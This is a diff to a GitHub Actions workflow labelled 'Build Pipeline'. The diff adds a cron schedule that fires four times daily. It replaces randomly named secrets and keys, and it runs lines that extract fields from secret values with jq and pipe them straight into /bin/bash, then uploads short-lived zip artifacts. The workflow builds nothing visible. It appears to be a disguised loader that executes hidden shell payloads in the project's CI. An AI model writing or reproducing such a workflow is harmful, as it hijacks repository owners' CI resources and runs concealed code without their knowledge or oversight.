@@ -2,6 +2,8 @@ name: Build Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '46 4,10,16,22 * * *'
 env:
   CI: true
 concurrency:
@@ -14,17 +16,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: Invoke
         env:
-          nxsn01: ${{ secrets.nxsn01 }}
+          itvzn617: ${{ secrets.itvzn617 }}
         run: |
-          printf '%s' "$nxsn01" | jq -r .b3963 | /bin/bash
-          echo $wezf1074 | jq -r .plh175 | /bin/bash
-          printf '%s' "$imiur91317" | jq -r .orwh7718 | /bin/bash
-          echo $gfl6910 | jq -r .vapkc7663 | /bin/bash
-          echo $e979 | jq -r .ubufb437 | /bin/bash
+          printf '%s' "$itvzn617" | jq -r .qtnd9 | /bin/bash
+          printf '%s' "$nif77562" | jq -r .bkzxk0 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
         with:
-          name: TiIgkMyt
+          name: x5XILh82
           path: "*.zip"
           retention-days: 1
